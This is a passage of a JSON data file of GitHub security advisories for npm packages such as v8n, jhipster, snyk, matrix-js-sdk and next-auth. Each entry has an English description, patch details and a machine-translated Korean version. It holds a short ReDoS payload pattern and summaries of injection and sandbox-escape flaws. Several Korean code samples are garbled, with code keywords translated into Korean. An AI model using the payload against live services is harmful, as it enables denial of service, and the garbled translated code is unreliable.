    "description": "### Impact\nInefficient regular expression complexity of `lowercase()` and `uppercase()` regex could lead to a denial of service attack. With a formed payload `'a' + 'a'.repeat(i) + 'A'`, only 32 characters payload could take 29443 ms time execution when testing `lowercase()`. The same issue happens with `uppercase()`.\n\n### Patches\nv1.5.1\n\n### References\n[huntr.dev report](https://huntr.dev/bounties/2d92f644-593b-43b4-bfd1-c8042ac60609)\n[_Regular Expression Denial of Service (ReDoS) and Catastrophic Backtracking_](https://snyk.io/blog/redos-and-catastrophic-backtracking/)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [v8n issues list](https://github.com/imbrn/v8n)\n* Email us at [brunodev02221@gmail.com](mailto:brunodev02221@gmail.com)\n",
    "identifiers": "GHSA : GHSA-xrx9-gj26-5wx9\nCVE : CVE-2022-35923",
    "severity": "HIGH",
    "updatedAt": "2023-07-31T20:43:20Z",
    "publishedAt": "2022-10-07T07:33:44Z",
    "references": "https://github.com/imbrn/v8n/security/advisories/GHSA-xrx9-gj26-5wx9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-35923\nhttps://github.com/imbrn/v8n/commit/92393862156fad190c05ec3f6e2bc73308dcd2f9\nhttps://huntr.dev/bounties/2d92f644-593b-43b4-bfd1-c8042ac60609/\nhttps://github.com/advisories/GHSA-xrx9-gj26-5wx9",
    "name": "v8n",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.5.1",
    "identifier": "1.5.1",
    "descriptionKR": "### 영향\n`lowercase()` 및 `uppercase()` 정규식의 비효율적인 정규식 복잡성은 서비스 거부 공격으로 이어질 수 있습니다. 페이로드 `'a' + 'a'.repeat(i) + 'A'`로 구성된 페이로드는 `lowercase()`를 테스트할 때 32자 페이로드만 29443ms 실행 시간이 걸릴 수 있습니다. `uppercase()`에서도 같은 문제가 발생합니다.\n\n### 패치\nv1.5.1\n\n### 참조\n[huntr.dev 보고서](https://huntr.dev/bounties/2d92f644-593b-43b4-bfd1-c8042ac60609)\n[_정규식 서비스 거부(ReDoS) 및 치명적 역추적_](https://snyk.io/blog/redos-and-catastrophic-backtracking/)\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [v8n 이슈 목록](https://github.com/imbrn/v8n)에서 이슈 열기\n* [brunodev02221@gmail.com](mailto:brunodev02221@gmail.com)으로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\nFor applications using JWT or session-based authentication (not OIDC), users can input a login string which can cause a denial of service, as parsing it will be too complex.\n\nHere is an example: https://gist.github.com/atomfrede/311f8a9c6eb74c5c5226af0481155207\n\nThe vulnerable expression was never officially released. So only when you generated an application from the master branch between 6.8.0 and 6.9.0 your generated application may be vulnerable.\n\n### Patches\n\nIf you only used official releases you don't need to patch your application.\n\n### Workarounds\n\nIf you have created an application from the master branch, you need to adapt the `LOGIN_REGEX` in `Constants.java`. If your regex is \n```\n^[a-zA-Z0-9!#$&'*+=?^_`{|}~.-]+@?[a-zA-Z0-9-]+(?:\\\\.[a-zA-Z0-9-]+)*$\n```\nyou need to change it too \n```\n^(?>[a-zA-Z0-9!$&*+=?^_`{|}~.-]+@[a-zA-Z0-9-]+(?:\\\\.[a-zA-Z0-9-]+)*)|(?>[_.@A-Za-z0-9-]+)$\n```\n \nIf you still have `^[_.@A-Za-z0-9-]*$` there is no need to change it, except you would like to support login with `+` sign (e.g. `foo+bar@example.com`).\n\n### References\n\n* https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n* https://snyk.io/blog/redos-and-catastrophic-backtracking/",
    "identifiers": "GHSA : GHSA-8w7w-67mw-r5p7",
    "severity": "HIGH",
    "updatedAt": "2023-01-12T05:05:36Z",
    "publishedAt": "2022-10-06T22:56:29Z",
    "references": "https://github.com/jhipster/generator-jhipster/security/advisories/GHSA-8w7w-67mw-r5p7\nhttps://gist.github.com/atomfrede/311f8a9c6eb74c5c5226af0481155207\nhttps://www.jhipster.tech/2020/05/17/jhipster-release-6.9.0.html\nhttps://github.com/advisories/GHSA-8w7w-67mw-r5p7",
    "name": "generator-jhipster",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "> 6.8.0, < 6.9.0",
    "descriptionKR": "### 영향\nJWT 또는 세션 기반 인증(OIDC가 아님)을 사용하는 애플리케이션의 경우 사용자는 구문 분석이 너무 복잡하기 때문에 서비스 거부를 유발할 수 있는 로그인 문자열을 입력할 수 있습니다.\n\n예는 다음과 같습니다. https://gist.github.com/atomfrede/311f8a9c6eb74c5c5226af0481155207\n\n취약한 표현은 공식적으로 공개되지 않았습니다. 따라서 6.8.0과 6.9.0 사이의 마스터 브랜치에서 애플리케이션을 생성한 경우에만 생성된 애플리케이션이 취약할 수 있습니다.\n\n### 패치\n\n공식 릴리스만 사용한 경우 애플리케이션을 패치할 필요가 없습니다.\n\n### 해결 방법\n\n마스터 브랜치에서 애플리케이션을 만든 경우 `Constants.java`에서 `LOGIN_REGEX`를 조정해야 합니다. 정규식이\n```\n^[a-zA-Z0-9!#$&'*+=?^_`{|}~.-]+@?[a-zA-Z0-9-]+(?:\\\\.[a -zA-Z0-9-]+)*$\n```\n당신도 그것을 변경해야합니다\n```\n^(?>[a-zA-Z0-9!$&*+=?^_`{|}~.-]+@[a-zA-Z0-9-]+(?:\\\\.[a -zA-Z0-9-]+)*)|(?>[_.@A-Za-z0-9-]+)$\n```\n \n여전히 `^[_.@A-Za-z0-9-]*$`가 있는 경우 `+` 기호(예: `foo+bar@example .com`).\n\n### 참조\n\n* https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n* https://snyk.io/blog/redos-and-catastrophic-backtracking/"
  },
  {
    "description": "Snyk CLI before 1.996.0 allows arbitrary command execution, affecting Snyk IDE plugins and the snyk npm package. Exploitation could follow from the common practice of viewing untrusted files in the Visual Studio Code editor, for example. The original demonstration was with shell metacharacters in the vendor.json ignore field, affecting snyk-go-plugin before 1.19.1. This affects, for example, the Snyk TeamCity plugin (which does not update automatically) before 20220930.142957.",
    "identifiers": "GHSA : GHSA-hpqj-7cj6-hfj8\nCVE : CVE-2022-40764",
    "severity": "HIGH",
    "updatedAt": "2023-08-08T21:17:32Z",
    "publishedAt": "2022-10-04T00:00:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-40764\nhttps://github.com/snyk/cli/releases/tag/v1.996.0\nhttps://github.com/snyk/snyk-go-plugin/releases/tag/v1.19.1\nhttps://support.snyk.io/hc/en-us/articles/7015908293789-CVE-2022-40764-Command-Injection-vulnerability-affecting-Snyk-CLI-versions-prior-to-1-996-0\nhttps://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/\nhttps://github.com/advisories/GHSA-hpqj-7cj6-hfj8",
    "name": "snyk-go-plugin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.19.1",
    "identifier": "1.19.1",
    "descriptionKR": "1.996.0 이전의 Snyk CLI는 임의의 명령 실행을 허용하여 Snyk IDE 플러그인 및 snyk npm 패키지에 영향을 미칩니다. 예를 들어 Visual Studio Code 편집기에서 신뢰할 수 없는 파일을 보는 일반적인 관행에서 악용이 따를 수 있습니다. 원래 데모는 1.19.1 이전의 snyk-go-plugin에 영향을 주는 vendor.json ignore 필드의 셸 메타문자를 사용했습니다. 이는 예를 들어 20220930.142957 이전의 Snyk TeamCity 플러그인(자동으로 업데이트되지 않음)에 영향을 미칩니다."
  },
  {
    "description": "Snyk CLI before 1.996.0 allows arbitrary command execution, affecting Snyk IDE plugins and the snyk npm package. Exploitation could follow from the common practice of viewing untrusted files in the Visual Studio Code editor, for example. The original demonstration was with shell metacharacters in the vendor.json ignore field, affecting snyk-go-plugin before 1.19.1. This affects, for example, the Snyk TeamCity plugin (which does not update automatically) before 20220930.142957.",
    "identifiers": "GHSA : GHSA-hpqj-7cj6-hfj8\nCVE : CVE-2022-40764",
    "severity": "HIGH",
    "updatedAt": "2023-08-08T21:17:32Z",
    "publishedAt": "2022-10-04T00:00:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-40764\nhttps://github.com/snyk/cli/releases/tag/v1.996.0\nhttps://github.com/snyk/snyk-go-plugin/releases/tag/v1.19.1\nhttps://support.snyk.io/hc/en-us/articles/7015908293789-CVE-2022-40764-Command-Injection-vulnerability-affecting-Snyk-CLI-versions-prior-to-1-996-0\nhttps://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/\nhttps://github.com/advisories/GHSA-hpqj-7cj6-hfj8",
    "name": "snyk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.996.0",
    "identifier": "1.996.0",
    "descriptionKR": "1.996.0 이전의 Snyk CLI는 임의의 명령 실행을 허용하여 Snyk IDE 플러그인 및 snyk npm 패키지에 영향을 미칩니다. 예를 들어 Visual Studio Code 편집기에서 신뢰할 수 없는 파일을 보는 일반적인 관행에서 악용이 따를 수 있습니다. 원래 데모는 1.19.1 이전의 snyk-go-plugin에 영향을 주는 vendor.json ignore 필드의 셸 메타문자를 사용했습니다. 이는 예를 들어 20220930.142957 이전의 Snyk TeamCity 플러그인(자동으로 업데이트되지 않음)에 영향을 미칩니다."
  },
  {
    "description": "Versions of `require-node` prior to 1.3.4 for 1.x and 2.0.4 for 2.x are vulnerable to Arbitrary Code Execution. The package fails to sanitize requests to the `require-node` endpoint, allowing attackers to execute arbitrary code in the server through the injection of OS commands in the request body.\n\n\n## Recommendation\n\n- If you are using 1.x, upgrade to version 1.3.4 or later.\n- If you are using 2.x, upgrade to version 2.0.4 or later.",
    "identifiers": "GHSA : GHSA-8j6j-4h2c-c65p",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-12T05:02:03Z",
    "publishedAt": "2020-09-03T17:02:52Z",
    "references": "https://www.npmjs.com/advisories/1015\nhttps://github.com/advisories/GHSA-8j6j-4h2c-c65p",
    "name": "require-node",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, < 2.0.4",
    "identifier": "2.0.4",
    "descriptionKR": "1.x용 1.3.4 및 2.x용 2.0.4 이전의 `require-node` 버전은 임의 코드 실행에 취약합니다. 이 패키지는 'require-node' 엔드포인트에 대한 요청을 삭제하지 못하여 공격자가 요청 본문에 OS 명령을 삽입하여 서버에서 임의의 코드를 실행할 수 있습니다.\n\n\n## 추천\n\n- 1.x를 사용하는 경우 버전 1.3.4 이상으로 업그레이드하십시오.\n- 2.x를 사용 중인 경우 2.0.4 이상 버전으로 업그레이드하세요."
  },
  {
    "description": "Affected versions of `jquery` use a lowercasing logic on attribute names. When given a boolean attribute with a name that contains uppercase characters, `jquery` enters into an infinite recursion loop, exceeding the call stack limit, and resulting in a denial of service condition.\n\n\n## Recommendation\n\nUpdate to version 3.0.0 or later.",
    "identifiers": "GHSA : GHSA-mhpp-875w-9cpv\nCVE : CVE-2016-10707",
    "severity": "HIGH",
    "updatedAt": "2023-01-12T05:02:02Z",
    "publishedAt": "2018-01-22T13:32:42Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2016-10707\nhttps://github.com/jquery/jquery/issues/3133\nhttps://github.com/advisories/GHSA-mhpp-875w-9cpv\nhttps://www.npmjs.com/advisories/330\nhttps://github.com/jquery/jquery/pull/3134\nhttps://snyk.io/vuln/npm:jquery:20160529\nhttps://github.com/jquery/jquery/issues/3133#issuecomment-358978489",
    "name": "jquery",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 3.0.0-rc.1",
    "identifier": "3.0.0",
    "descriptionKR": "영향을 받는 `jquery` 버전은 속성 이름에 소문자 논리를 사용합니다. 이름에 대문자가 포함된 부울 속성이 제공되면 'jquery'는 무한 재귀 루프에 들어가 호출 스택 제한을 초과하여 서비스 거부 조건을 초래합니다.\n\n\n## 추천\n\n버전 3.0.0 이상으로 업데이트하십시오."
  },
  {
    "description": "### Impact\nIf the untrusted v8 cached data is passed to the API through CachedDataOptions, the attackers can bypass the sandbox and run arbitrary code in the nodejs process. There are currently no known fixed versions or workarounds.\n\n",
    "identifiers": "GHSA : GHSA-2jjq-x548-rhpv\nCVE : CVE-2022-39266",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:09:01Z",
    "publishedAt": "2022-09-30T22:59:03Z",
    "references": "https://github.com/laverdet/isolated-vm/security/advisories/GHSA-2jjq-x548-rhpv\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39266\nhttps://github.com/advisories/GHSA-2jjq-x548-rhpv",
    "name": "isolated-vm",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 4.3.6",
    "descriptionKR": "### 영향\n신뢰할 수 없는 v8 캐시 데이터가 CachedDataOptions를 통해 API에 전달되면 공격자는 샌드박스를 우회하고 nodejs 프로세스에서 임의의 코드를 실행할 수 있습니다. 현재 알려진 수정 버전이나 해결 방법이 없습니다."
  },
  {
    "description": "## Impact\n\nAn attacker cooperating with a malicious homeserver could interfere with the verification flow between two users, injecting its own cross-signing user identity in place of one of the users’ identities, leading to the other device trusting/verifying the user identity under the control of the homeserver instead of the intended one.\n\nThe vulnerability is a bug in the matrix-js-sdk, caused by checking and signing user identities and devices in two separate steps, and inadequately fixing the keys to be signed between those steps.\n\nEven though the attack is partly made possible due to the design decision of treating cross-signing user identities as Matrix devices on the server side (with their device ID set to the public part of the user identity key), no other examined implementations were vulnerable.\n\n## Patches\n\nThe matrix-js-sdk has been modified to double check that the key signed is the one that was verified instead of just referencing the key by ID. An additional check has been made to report an error when one of the device ID matches a cross-signing key.\n\n## Workarounds\n\nAs this attack requires coordination between a malicious homeserver and an attacker -- if you trust your homeserver no particular workaround is needed. \n\nAs a potential way of detecting compromise, it’s possible to review your device list or the device list of other users for devices with IDs in the form of a base64 cross-signing key (`5XaczGNlfz0bl8R1IX5qn+tBoue2tWJqLMh+SDUuvCk`) instead of classical device ID (`SEHACYDHMG`).\n\n## References\nBlog post: https://matrix.org/blog/2022/09/28/upgrade-now-to-address-encryption-vulns-in-matrix-sdks-and-clients\n\n## For more information\nIf you have any questions or comments about this advisory, e-mail us at security@matrix.org\n",
    "identifiers": "GHSA : GHSA-5w8r-8pgj-5jmf\nCVE : CVE-2022-39250",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:02:44Z",
    "publishedAt": "2022-09-30T22:46:50Z",
    "references": "https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-5w8r-8pgj-5jmf\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39250\nhttps://github.com/matrix-org/matrix-js-sdk/commit/a587d7c36026fe1fcf93dfff63588abee359be76\nhttps://github.com/matrix-org/matrix-js-sdk/releases/tag/v19.7.0\nhttps://matrix.org/blog/2022/09/28/upgrade-now-to-address-encryption-vulns-in-matrix-sdks-and-clients\nhttps://security.gentoo.org/glsa/202210-35\nhttps://github.com/advisories/GHSA-5w8r-8pgj-5jmf",
    "name": "matrix-js-sdk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 19.7.0",
    "identifier": "19.7.0",
    "descriptionKR": "## 영향\n\n악의적인 홈 서버와 협력하는 공격자는 두 사용자 간의 확인 흐름을 방해하여 사용자 ID 중 하나 대신 자체 교차 서명 사용자 ID를 삽입하여 다른 장치가 사용자 ID를 신뢰/확인하도록 유도할 수 있습니다. 의도한 서버 대신 홈 서버.\n\n이 취약성은 두 개의 개별 단계에서 사용자 ID 및 장치를 확인 및 서명하고 해당 단계 사이에 서명할 키를 부적절하게 수정하여 발생하는 matrix-js-sdk의 버그입니다.\n\n서버 측에서 교차 서명 사용자 ID를 Matrix 장치로 취급하는 설계 결정으로 인해 부분적으로 공격이 가능해졌지만(해당 장치 ID는 사용자 ID 키의 공개 부분으로 설정됨) 검사된 다른 구현은 취약하지 않았습니다. .\n\n## 패치\n\nmatrix-js-sdk는 서명된 키가 ID로 키를 참조하는 대신 확인된 키인지 다시 확인하도록 수정되었습니다. 장치 ID 중 하나가 교차 서명 키와 일치할 때 오류를 보고하기 위해 추가 검사가 수행되었습니다.\n\n## 해결 방법\n\n이 공격에는 악의적인 홈 서버와 공격자 간의 조정이 필요하므로 홈 서버를 신뢰하는 경우 특별한 해결 방법이 필요하지 않습니다.\n\n손상을 감지하는 잠재적인 방법으로 기존 장치 ID 대신 base64 교차 서명 키(`5XaczGNlfz0bl8R1IX5qn+tBoue2tWJqLMh+SDUuvCk`) 형식의 ID가 있는 장치에 대해 장치 목록 또는 다른 사용자의 장치 목록을 검토할 수 있습니다. (`SEHACYDHMG`).\n\n## 참조\n블로그 게시물: https://matrix.org/blog/2022/09/28/upgrade-now-to-address-encryption-vulns-in-matrix-sdks-and-clients\n\n## 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우 security@matrix.org로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\nApplications that use `next-auth` Email Provider and `@next-auth/upstash-redis-adapter` before v3.0.2 are affected.\n\n### Description\nThe Upstash Redis adapter implementation did not check for both the identifier (email) and the token, but only checking for the identifier when verifying the token in the email callback flow. An attacker who knows about the victim's email could easily sign in as the victim, given the attacker also knows about the verification token's expired duration. \n\n### Patches\nThe vulnerability is patched in v3.0.2.\nTo upgrade, run one of the following:\n```\nnpm i @next-auth/upstash-redis-adapter@latest\n```\n```\nyarn add @next-auth/upstash-redis-adapter@latest\n```\n```\npnpm add @next-auth/upstash-redis-adapter@latest\n```\n\n### Workarounds\nUsing Advanced Initialization, developers can check the requests and compare the query's token and identifier before proceeding. Below is an example of how to do this: (Upgrading is still strongly recommended)\n\n```js\nimport { createHash } from \"crypto\"\nexport default async function auth(req, res) {\n  if (req.method === \"POST\" && req.action === \"callback\") {\n    const token = req.query?.token\n    const identifier = req.query?.email\n    function hashToken(token: string) {\n      const provider = authOptions.providers.find((p) => p.id === \"email\")\n      const secret = authOptions.secret\n      return (\n        createHash(\"sha256\")\n          // Prefer provider specific secret, but use default secret if none specified\n          .update(`${token}${provider.secret ?? secret}`)\n          .digest(\"hex\")\n      )\n    }\n    const hashedToken = hashToken(token)\n\n    const invite = await authOptions.adapter.useVerificationToken?.({\n      identifier,\n      token: hashedToken,\n    })\n    if (invite.token !== hashedToken) {\n      res.status(400).json({ error: \"Invalid token\" })\n    }\n  }\n  return await NextAuth(req, res, authOptions)\n}\n\n```\n### References\nEmailProvider: https://next-auth.js.org/providers/email\nAdvanced Initialization: https://next-auth.js.org/configuration/initialization#advanced-initialization\nUpstash Redis Adapter: https://next-auth.js.org/adapters/upstash-redis\n\n### For more information\nIf you have any concerns, we request responsible disclosure, outlined here: https://next-auth.js.org/security#reporting-a-vulnerability\n\n",
    "identifiers": "GHSA : GHSA-4rxr-27mm-mxq9\nCVE : CVE-2022-39263",
    "severity": "MODERATE",
    "updatedAt": "2023-01-29T05:05:15Z",
    "publishedAt": "2022-09-30T05:31:32Z",
    "references": "https://github.com/nextauthjs/next-auth/security/advisories/GHSA-4rxr-27mm-mxq9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39263\nhttps://github.com/nextauthjs/next-auth/commit/d16e04848ee703cf797724194d4ad2907fe125a9\nhttps://github.com/advisories/GHSA-4rxr-27mm-mxq9",
    "name": "@next-auth/upstash-redis-adapter",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.0.2",
    "identifier": "3.0.2",
    "descriptionKR": "### 영향\nv3.0.2 이전의 `next-auth` 이메일 공급자 및 `@next-auth/upstash-redis-adapter`를 사용하는 애플리케이션이 영향을 받습니다.\n\n### 설명\nUpstash Redis 어댑터 구현은 식별자(이메일)와 토큰을 모두 확인하지 않고 이메일 콜백 흐름에서 토큰을 확인할 때 식별자만 확인했습니다. 피해자의 이메일에 대해 알고 있는 공격자는 확인 토큰의 만료 기간도 알고 있으므로 쉽게 피해자로 로그인할 수 있습니다.\n\n### 패치\n이 취약점은 v3.0.2에서 패치되었습니다.\n업그레이드하려면 다음 중 하나를 실행하십시오.\n```\nnpm i @next-auth/upstash-redis-adapter@latest\n```\n```\n실 추가 @next-auth/upstash-redis-adapter@latest\n```\n```\npnpm add @next-auth/upstash-redis-adapter@latest\n```\n\n### 해결 방법\n고급 초기화를 사용하여 개발자는 진행하기 전에 요청을 확인하고 쿼리의 토큰과 식별자를 비교할 수 있습니다. 다음은 이를 수행하는 방법의 예입니다. (업그레이드는 여전히 강력히 권장됨)\n\n```js\n\"crypto\"에서 { createHash } 가져오기\n기본 비동기 함수 내보내기 auth(req, res) {\n  if (req.method === \"POST\" && req.action === \"콜백\") {\n    const 토큰 = req.query?.token\n    const 식별자 = req.query?.email\n    함수 hashToken(토큰: 문자열) {\n      const 공급자 = authOptions.providers.find((p) => p.id === \"이메일\")\n      const secret = authOptions.secret\n      반품 (\n        createHash(\"sha256\")\n          // 공급자 특정 비밀을 선호하지만 지정되지 않은 경우 기본 비밀을 사용합니다.\n          .update(`${토큰}${provider.secret ?? 비밀}`)\n          .digest(\"헥스\")\n      )\n    }\n    const hashedToken = hashToken(토큰)\n\n    const 초대 = 대기 authOptions.adapter.useVerificationToken?.({\n      식별자,\n      토큰: hashedToken,\n    })\n    if (invite.token !== hashedToken) {\n      res.status(400).json({ 오류: \"잘못된 토큰\" })\n    }\n  }\n  NextAuth(req, res, authOptions) 대기를 반환합니다.\n}\n\n```\n### 참조\n이메일 공급자: https://next-auth.js.org/providers/email\n고급 초기화: https://next-auth.js.org/configuration/initialization#advanced-initialization\nUpstash Redis 어댑터: https://next-auth.js.org/adapters/upstash-redis\n\n### 자세한 내용은\n우려 사항이 있는 경우 https://next-auth.js.org/security#reporting-a-vulnerability에 설명된 책임 있는 공개를 요청합니다."
  },
  {
    "description": "Strapi before 3.6.10 and 4.x before 4.1.10 mishandles hidden attributes within admin API responses.",
    "identifiers": "GHSA : GHSA-4phg-hpqm-c3j4\nCVE : CVE-2022-31367",
    "severity": "HIGH",
    "updatedAt": "2023-02-02T05:01:03Z",
    "publishedAt": "2022-09-28T00:00:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-31367\nhttps://github.com/kos0ng/CVEs/tree/main/CVE-2022-31367\nhttps://github.com/strapi/strapi/releases/tag/v3.6.10\nhttps://github.com/strapi/strapi/releases/tag/v4.1.10\nhttps://github.com/strapi/strapi/pull/13185\nhttps://github.com/strapi/strapi/pull/13189\nhttps://github.com/advisories/GHSA-4phg-hpqm-c3j4",
    "name": "@strapi/strapi",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0-next.0, < 4.1.10",
    "identifier": "4.1.10",
    "descriptionKR": "3.6.10 이전의 Strapi 및 4.1.10 이전의 4.x는 관리 API 응답 내의 숨겨진 속성을 잘못 처리합니다."
  },
  {
    "description": "Strapi before 3.6.10 and 4.x before 4.1.10 mishandles hidden attributes within admin API responses.",
    "identifiers": "GHSA : GHSA-4phg-hpqm-c3j4\nCVE : CVE-2022-31367",
    "severity": "HIGH",
    "updatedAt": "2023-02-02T05:01:03Z",
    "publishedAt": "2022-09-28T00:00:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-31367\nhttps://github.com/kos0ng/CVEs/tree/main/CVE-2022-31367\nhttps://github.com/strapi/strapi/releases/tag/v3.6.10\nhttps://github.com/strapi/strapi/releases/tag/v4.1.10\nhttps://github.com/strapi/strapi/pull/13185\nhttps://github.com/strapi/strapi/pull/13189\nhttps://github.com/advisories/GHSA-4phg-hpqm-c3j4",
    "name": "strapi",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.6.10",
    "identifier": "3.6.10",
    "descriptionKR": "3.6.10 이전의 Strapi 및 4.1.10 이전의 4.x는 관리 API 응답 내의 숨겨진 속성을 잘못 처리합니다."
  },
  {
    "description": "The package express-xss-sanitizer before 1.1.3 is vulnerable to Prototype Pollution via the `allowedTags` attribute, allowing the attacker to bypass xss sanitization.",
    "identifiers": "GHSA : GHSA-grjp-4jmr-mjcw\nCVE : CVE-2022-21169",
    "severity": "MODERATE",
    "updatedAt": "2023-01-29T05:05:14Z",
    "publishedAt": "2022-09-27T00:00:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-21169\nhttps://github.com/AhmedAdelFahim/express-xss-sanitizer/issues/4\nhttps://github.com/AhmedAdelFahim/express-xss-sanitizer/commit/3bf8aaaf4dbb1c209dcb8d87a82711a54c1ab39a\nhttps://runkit.com/embed/w306l6zfm7tu\nhttps://security.snyk.io/vuln/SNYK-JS-EXPRESSXSSSANITIZER-3027443\nhttps://github.com/advisories/GHSA-grjp-4jmr-mjcw",
    "name": "express-xss-sanitizer",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.1.3",
    "identifier": "1.1.3",
    "descriptionKR": "패키지 express-xss-sanitizer 1.1.3 이전은 'allowedTags' 속성을 통해 Prototype Pollution에 취약하여 공격자가 xss 삭제를 우회할 수 있습니다."
  },
  {
    "description": "### Impact\n\nAn attacker cooperating with a malicious homeserver can construct messages that legitimately appear to have come from another person, without any indication such as a grey shield.\n\nAdditionally, a sophisticated attacker cooperating with a malicious homeserver could employ this vulnerability to perform a targeted attack in order to send fake to-device messages appearing to originate from another user. This can allow, for example, to inject the key backup secret during a self-verification, to make a targeted device start using a malicious key backup spoofed by the homeserver.\n\nThese attacks are possible due to a protocol confusion vulnerability that accepts to-device messages encrypted with Megolm instead of Olm.\n\n### Patches\n\nmatrix-js-sdk has been modified to only accept Olm-encrypted to-device messages.\n\nOut of caution, several other checks have been audited or added:\n- Cleartext `m.room_key`, `m.forwarded_room_key` and `m.secret.send` to_device messages are discarded.\n- Secrets received from untrusted devices are discarded.\n- Key backups are only usable if they have a valid signature from a trusted device (no more local trust, or trust-on-decrypt).\n- The origin of a to-device message should only be determined by observing the Olm session which managed to decrypt the message, and not by using claimed sender_key, user_id, or any other fields controllable by the homeserver.\n\n### Workarounds\n\nAs this attack requires coordination between a malicious home server and an attacker, if you trust your home server no particular workaround is needed. Notice that the backup spoofing attack is a particularly sophisticated targeted attack.\n\nWe are not aware of this attack being used in the wild, though specifying a false positive-free way of noticing malicious key backups key is challenging.\n\nAs an abundance of caution, to avoid malicious backup attacks, you should not verify your new logins using emoji/QR verifications methods until patched. Prefer verifying with your security passphrase instead.\n\n### References\nBlog post: https://matrix.org/blog/2022/09/28/upgrade-now-to-address-encryption-vulns-in-matrix-sdks-and-clients\n\n### For more information\nIf you have any questions or comments about this advisory, e-mail us at [security@matrix.org](mailto:security@matrix.org).\n",
    "identifiers": "GHSA : GHSA-r48r-j8fx-mq2c\nCVE : CVE-2022-39251",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:02:55Z",
    "publishedAt": "2022-09-30T00:41:24Z",
    "references": "https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-r48r-j8fx-mq2c\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39251\nhttps://github.com/matrix-org/matrix-js-sdk/commit/a587d7c36026fe1fcf93dfff63588abee359be76\nhttps://github.com/matrix-org/matrix-js-sdk/releases/tag/v19.7.0\nhttps://matrix.org/blog/2022/09/28/upgrade-now-to-address-encryption-vulns-in-matrix-sdks-and-clients\nhttps://security.gentoo.org/glsa/202210-35\nhttps://github.com/advisories/GHSA-r48r-j8fx-mq2c",
    "name": "matrix-js-sdk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 19.7.0",
    "identifier": "19.7.0",
    "descriptionKR": "### 영향\n\n악의적인 홈 서버와 협력하는 공격자는 회색 방패와 같은 표시 없이 합법적으로 다른 사람이 보낸 것처럼 보이는 메시지를 구성할 수 있습니다.\n\n또한 악의적인 홈 서버와 협력하는 정교한 공격자는 이 취약점을 이용하여 다른 사용자가 보낸 것처럼 보이는 가짜 메시지를 장치에 보내기 위해 표적 공격을 수행할 수 있습니다. 예를 들어 자가 검증 중에 키 백업 비밀을 주입하여 대상 장치가 홈 서버에 의해 스푸핑된 악의적인 키 백업을 사용하여 시작하도록 할 수 있습니다.\n\n이러한 공격은 Olm 대신 Megolm으로 암호화된 to-device 메시지를 받아들이는 프로토콜 혼동 취약점으로 인해 가능합니다.\n\n### 패치\n\nmatrix-js-sdk는 Olm으로 암호화된 장치 메시지만 수락하도록 수정되었습니다.\n\n주의를 기울이지 않고 몇 가지 다른 검사가 감사되거나 추가되었습니다.\n- 일반 텍스트 `m.room_key`, `m.forwarded_room_key` 및 `m.secret.send` to_device 메시지는 삭제됩니다.\n- 신뢰할 수 없는 장치에서 받은 비밀은 폐기됩니다.\n- 키 백업은 신뢰할 수 있는 장치의 유효한 서명이 있는 경우에만 사용할 수 있습니다(로컬 신뢰 또는 암호 해독 신뢰 없음).\n- to-device 메시지의 출처는 청구된 sender_key, user_id 또는 홈 서버에서 제어할 수 있는 다른 필드를 사용하는 것이 아니라 메시지를 해독한 Olm 세션을 관찰함으로써만 결정되어야 합니다.\n\n### 해결 방법\n\n이 공격은 악의적인 홈 서버와 공격자 간의 조정이 필요하므로 홈 서버를 신뢰하는 경우 특별한 해결 방법이 필요하지 않습니다. 백업 스푸핑 공격은 특히 정교한 표적 공격입니다.\n\n악의적인 키 백업 키를 인식하는 오탐 없는 방법을 지정하는 것은 어려운 일이지만 이 공격이 야생에서 사용되는 것을 인식하지 못합니다.\n\n악의적인 백업 공격을 피하려면 패치가 적용될 때까지 이모지/QR 확인 방법을 사용하여 새 로그인을 확인해서는 안 됩니다. 대신 보안 암호로 확인하는 것이 좋습니다.\n\n### 참조\n블로그 게시물: https://matrix.org/blog/2022/09/28/upgrade-now-to-address-encryption-vulns-in-matrix-sdks-and-clients\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있으면 [security@matrix.org](mailto:security@matrix.org)로 이메일을 보내주십시오."
  },
  {
